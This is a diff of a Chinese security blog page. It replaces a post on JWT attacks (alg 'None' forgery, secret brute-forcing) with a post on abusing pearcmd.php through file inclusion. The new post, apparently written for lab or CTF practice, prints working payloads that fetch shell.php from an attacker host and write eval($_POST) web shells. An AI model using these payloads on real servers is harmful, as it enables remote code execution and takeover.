@@ -5,27 +5,28 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="http://example.com">
-  <title>Warrenli&#39;s blog</title>
+  <link rel="dns-prefetch" href="https://blog.warrenli.fun">
+  <title>pearcmd.php的妙用 | Warrenli&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="签名过程JWT(JSON Web Token)的签名验证过程主要包括以下几个步骤：  分离解构：JWT的Header和Payload是通过句点(.)分隔的，因此需要将JWT按照句点分隔符进行分离 验证签名：通过使用指定算法对Header和Payload进行签名生成签名结果，然后将签名结果与JWT中的签名部分进行比较，如果两者相同则说明JWT的签名是有效的，否则说明JWT的签名是无效的 验证信息：如">
+  <meta name="description" content="register_argc_argv如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On 这个register_argc_argv能干什么呢？ 简言之，可以通过$_SERVER[‘argv’]&#96;获得命令行参数，其中 test.php 123&lt;?php  v">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Warrenli&#39;s blog">
-<meta property="og:url" content="http://example.com/2025/03/26/JWT/index.html">
+<meta property="og:title" content="pearcmd.php的妙用">
+<meta property="og:url" content="https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/index.html">
 <meta property="og:site_name" content="Warrenli&#39;s blog">
-<meta property="og:description" content="签名过程JWT(JSON Web Token)的签名验证过程主要包括以下几个步骤：  分离解构：JWT的Header和Payload是通过句点(.)分隔的，因此需要将JWT按照句点分隔符进行分离 验证签名：通过使用指定算法对Header和Payload进行签名生成签名结果，然后将签名结果与JWT中的签名部分进行比较，如果两者相同则说明JWT的签名是有效的，否则说明JWT的签名是无效的 验证信息：如">
+<meta property="og:description" content="register_argc_argv如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On 这个register_argc_argv能干什么呢？ 简言之，可以通过$_SERVER[‘argv’]&#96;获得命令行参数，其中 test.php 123&lt;?php  v">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/03/26/JWT/1737008907369-b373555e-f498-4b18-845f-913b875ef085.png">
-<meta property="og:image" content="http://example.com/2025/03/26/JWT/1737008917081-a47c6954-ecfc-42a9-8f3c-26fe70e143bc.png">
-<meta property="og:image" content="http://example.com/2025/03/26/JWT/1737008952868-bee44dad-0254-41bc-96c6-3f44c2c3acd8.png">
-<meta property="og:image" content="http://example.com/2025/03/26/JWT/1737009011426-f953bbb3-9fc9-469f-b620-97d3a5705a69.png">
-<meta property="og:image" content="http://example.com/2025/03/26/JWT/1737010541090-5d7330c2-9cc8-4a85-95d2-a8af23b1a5da.png">
-<meta property="article:published_time" content="2025-03-26T06:49:53.893Z">
-<meta property="article:modified_time" content="2025-03-26T06:50:08.811Z">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513208-5dbf7551-dbd2-47d9-a6db-9373b359bb89.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513259-0f749338-88eb-40a0-b07f-9186dcdf806c.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513224-bdcb1900-0357-4a3b-9666-c17170ebd4c2.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513306-b2c77e30-5670-48f5-acdf-f1248d3ad585.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513486-5862c46e-85ba-4251-bae4-09904d58c5b0.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574514486-0ff8d4d1-dbc0-44bb-9d0e-08b6689165f2.png">
+<meta property="article:published_time" content="2025-03-31T07:03:18.000Z">
+<meta property="article:modified_time" content="2025-03-31T07:03:18.022Z">
 <meta property="article:author" content="Warrenli">
 <meta property="article:tag" content="网安，web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/03/26/JWT/1737008907369-b373555e-f498-4b18-845f-913b875ef085.png">
+<meta name="twitter:image" content="https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513208-5dbf7551-dbd2-47d9-a6db-9373b359bb89.png">
   
     <link rel="alternative" href="/atom.xml" title="Warrenli&#39;s blog" type="application/atom+xml">
   
@@ -149,41 +150,69 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-JWT" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-pearcmd.php的妙用" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pearcmd.php的妙用
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:03:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h2><p><font style="color:rgb(51, 51, 51);">JWT(JSON Web Token)的签名验证过程主要包括以下几个步骤：</font></p>
-<ul>
-<li><font style="color:rgb(51, 51, 51);">分离解构：JWT的Header和Payload是通过句点(.)分隔的，因此需要将JWT按照句点分隔符进行分离</font></li>
-<li><font style="color:rgb(51, 51, 51);">验证签名：通过使用指定算法对Header和Payload进行签名生成签名结果，然后将签名结果与JWT中的签名部分进行比较，如果两者相同则说明JWT的签名是有效的，否则说明JWT的签名是无效的</font></li>
-<li><font style="color:rgb(51, 51, 51);">验证信息：如果JWT的签名是有效的则需要对Payload中的信息进行验证，例如:可以验证JWT中的过期时间、发行者等信息是否正确，如果验证失败则说明JWT是无效的</font></li>
-</ul>
-<h2 id="签名用None"><a href="#签名用None" class="headerlink" title="签名用None"></a><font style="color:rgb(51, 51, 51);">签名用None</font></h2><p><font style="color:rgb(51, 51, 51);">场景介绍：</font></p>
-<ol>
-<li><font style="color:rgb(51, 51, 51);">在JWT的Header中alg的值用于告诉服务器使用哪种算法对令牌进行签名，从而告诉服务器在验证签名时需要使用哪种算法。</font></li>
-<li><font style="color:rgb(51, 51, 51);">目前可以选择HS256，即HMAC和SHA256，JWT同时也支持将算法设定为”None”，如果”alg”字段设为”None”，则标识不签名，这样一来任何token都是有效的。</font></li>
-<li><font style="color:rgb(51, 51, 51);">设定该功能的最初目的是为了方便调试，但是若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为”None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站</font></li>
-</ol>
-<h2 id="密钥暴力猜解"><a href="#密钥暴力猜解" class="headerlink" title="密钥暴力猜解"></a><font style="color:rgb(51, 51, 51);">密钥暴力猜解</font></h2><p><font style="color:rgb(51, 51, 51);">密钥介绍</font></p>
-<p><font style="color:rgb(51, 51, 51);">在JT中密钥用于生成和验证签名，因此密钥的安全性对JWT的安全性至关重要，一般来说JWT有以下两种类型的密钥：</font></p>
-<ul>
-<li><font style="color:rgb(51, 51, 51);">对称密钥：对称密钥是一种使用相同的密钥进行加密和解密的加密算法，在JWT中使用对称密钥来生成和验证签名，因此密钥必须保密，只有发送方和接收方知道，由于对称密钥的安全性取决于密钥的保密性，因此需要采取一些措施来保护它</font></li>
-<li><font style="color:rgb(51, 51, 51);">非对称密钥：非对称密钥使用公钥和私钥来加密和解密数据，在JWT中使用私钥生成签名，而使用公钥验证签名，由于公钥可以公开，因此非对称密钥通常用于验证方的身份</font></li>
-</ul>
-<p><font style="color:rgb(51, 51, 51);"></font></p>
-<p><font style="color:rgb(51, 51, 51);">在实现JWT应用程序时，开发人员有时会犯一些错误，比如：忘记更改默认密码或占位符密码，他们甚至可能复制并粘贴他们在网上找到的代码片段然后忘记更改作为示例提供的硬编码秘密，在这种情况下攻击者使用众所周知的秘密的单词列表来暴力破解服务器的秘密是很容易的，下面是一个公开已知密钥列表：</font></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list</a></p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="签名未校验"><a href="#签名未校验" class="headerlink" title="签名未校验"></a>签名未校验</h3><p><img src="/2025/03/26/JWT/1737008907369-b373555e-f498-4b18-845f-913b875ef085.png"></p>
-<p><img src="/2025/03/26/JWT/1737008917081-a47c6954-ecfc-42a9-8f3c-26fe70e143bc.png"></p>
-<p>这边的算法显示为None，导致下面校验不成功。</p>
-<p><img src="/2025/03/26/JWT/1737008952868-bee44dad-0254-41bc-96c6-3f44c2c3acd8.png"></p>
-<p>我们随便改一个，发现不需要密钥就能校验成功。</p>
-<p><img src="/2025/03/26/JWT/1737009011426-f953bbb3-9fc9-469f-b620-97d3a5705a69.png"></p>
-<p>将校验成功的拿去用就好了。</p>
-<h3 id="暴力破解密钥"><a href="#暴力破解密钥" class="headerlink" title="暴力破解密钥"></a>暴力破解密钥</h3><p><img src="/2025/03/26/JWT/1737010541090-5d7330c2-9cc8-4a85-95d2-a8af23b1a5da.png"></p>
-<p>成功爆破出密钥了。</p>
+        <hr>
+<h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</p>
+<p>这个register_argc_argv能干什么呢？</p>
+<p>简言之，可以通过$_SERVER[‘argv’]&#96;获得命令行参数，其中</p>
+<p>test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试</p>
+<p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513208-5dbf7551-dbd2-47d9-a6db-9373b359bb89.png"></p>
+<p>多个参数</p>
+<p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513259-0f749338-88eb-40a0-b07f-9186dcdf806c.png"></p>
+<h4 id="WEB模式中"><a href="#WEB模式中" class="headerlink" title="WEB模式中"></a>WEB模式中</h4><p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513224-bdcb1900-0357-4a3b-9666-c17170ebd4c2.png"></p>
+<p>注意其中是用+作为分隔符的，不是&amp;</p>
+<h4 id="简单的利用"><a href="#简单的利用" class="headerlink" title="简单的利用"></a>简单的利用</h4><p>修改test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>[<span class="number">0</span>](<span class="variable">$a</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513306-b2c77e30-5670-48f5-acdf-f1248d3ad585.png"></p>
+<h3 id="2-pearcmd-php的神奇使用"><a href="#2-pearcmd-php的神奇使用" class="headerlink" title="2. pearcmd.php的神奇使用"></a>2. pearcmd.php的神奇使用</h3><p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574513486-5862c46e-85ba-4251-bae4-09904d58c5b0.png"></p>
+<p>文件位置：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php</p>
+<p>pear可以用来拉取远程的代码（注意：如果是php代码的话，注意不要被解析，下面举个例子）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install -R /tmp http:<span class="comment">//vps/shell.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-register-argc-argv和pear的关系"><a href="#3-register-argc-argv和pear的关系" class="headerlink" title="3. register_argc_argv和pear的关系"></a>3. register_argc_argv和pear的关系</h3><p>pear文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># first find which PHP binary to use</span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then</span><br><span class="line">  PHP=<span class="string">&quot;<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/bin/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_bin<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    PHP=php</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PHP=<span class="string">&quot;/usr/bin/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="comment"># then look for the right pear include dir</span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then</span><br><span class="line">  INCDIR=<span class="variable">$PHP_PEAR_INSTALL_DIR</span></span><br><span class="line">  INCARG=<span class="string">&quot;-d include_path=<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/share/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_dir<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    INCDIR=`dirname $<span class="number">0</span>`</span><br><span class="line">    INCARG=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    INCDIR=<span class="string">&quot;/usr/share/php&quot;</span></span><br><span class="line">    INCARG=<span class="string">&quot;-d include_path=/usr/share/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec <span class="variable">$PHP</span> -C -q <span class="variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=<span class="number">1</span> -d variables_order=EGPCS -d open_basedir=<span class="string">&quot;&quot;</span> -d safe_mode=<span class="number">0</span> -d register_argc_argv=<span class="string">&quot;On&quot;</span> -d auto_prepend_file=<span class="string">&quot;&quot;</span> -d auto_append_file=<span class="string">&quot;&quot;</span> <span class="variable">$INCDIR</span>/pearcmd.php <span class="string">&quot;$@&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>需要注意的是：当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell。</strong></p>
+<h3 id="4-payload"><a href="#4-payload" class="headerlink" title="4. payload"></a>4. payload</h3><h4 id="靶机可出网"><a href="#靶机可出网" class="headerlink" title="靶机可出网"></a>靶机可出网</h4><p>靶机test.php如下，需要拉取远程服务器的shell.php到靶机的&#x2F;tmp目录下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test.php?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/1741574514486-0ff8d4d1-dbc0-44bb-9d0e-08b6689165f2.png"></p>
+<p>然后文件包含&#x2F;tmp&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;shell.php同时传参<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>即可</p>
+<h4 id="靶机不可出网时"><a href="#靶机不可出网时" class="headerlink" title="靶机不可出网时"></a>靶机不可出网时</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php?+config-create+/&amp;file=/usr/share/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure>
+
+<p>如果是post传的file：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span>+/<span class="keyword">var</span>/www/html/a.php </span><br><span class="line"></span><br><span class="line">file=file:<span class="comment">///usr/local/lib/php/pearcmd.php</span></span><br></pre></td></tr></table></figure>
+
 
       
 
@@ -263,7 +292,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2025/03/26/JWT/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://blog.warrenli.fun/2025/03/31/pearcmd.php%E7%9A%84%E5%A6%99%E7%94%A8/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -277,18 +306,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2025/03/26/PHP%E7%89%B9%E6%80%A7/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2025/03/31/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          (no title)
+          phpfilter死亡绕过---base64过滤字符
         
       </div>
     </a>
   
   
-    <a href="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">领航杯</div>
+    <a href="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">php session 反序列化</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -315,7 +344,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">签名过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E7%94%A8None"><span class="toc-number">2.</span> <span class="toc-text">签名用None</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E6%9A%B4%E5%8A%9B%E7%8C%9C%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">密钥暴力猜解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">4.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E6%9C%AA%E6%A0%A1%E9%AA%8C"><span class="toc-number">4.1.</span> <span class="toc-text">签名未校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E9%92%A5"><span class="toc-number">4.2.</span> <span class="toc-text">暴力破解密钥</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#register-argc-argv"><span class="toc-number">1.</span> <span class="toc-text">register_argc_argv</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WEB%E6%A8%A1%E5%BC%8F%E4%B8%AD"><span class="toc-number">1.1.</span> <span class="toc-text">WEB模式中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">简单的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-pearcmd-php%E7%9A%84%E7%A5%9E%E5%A5%87%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">2. pearcmd.php的神奇使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-register-argc-argv%E5%92%8Cpear%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">3.</span> <span class="toc-text">3. register_argc_argv和pear的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-payload"><span class="toc-number">4.</span> <span class="toc-text">4. payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E5%8F%AF%E5%87%BA%E7%BD%91"><span class="toc-number">4.1.</span> <span class="toc-text">靶机可出网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%B8%8D%E5%8F%AF%E5%87%BA%E7%BD%91%E6%97%B6"><span class="toc-number">4.2.</span> <span class="toc-text">靶机不可出网时</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
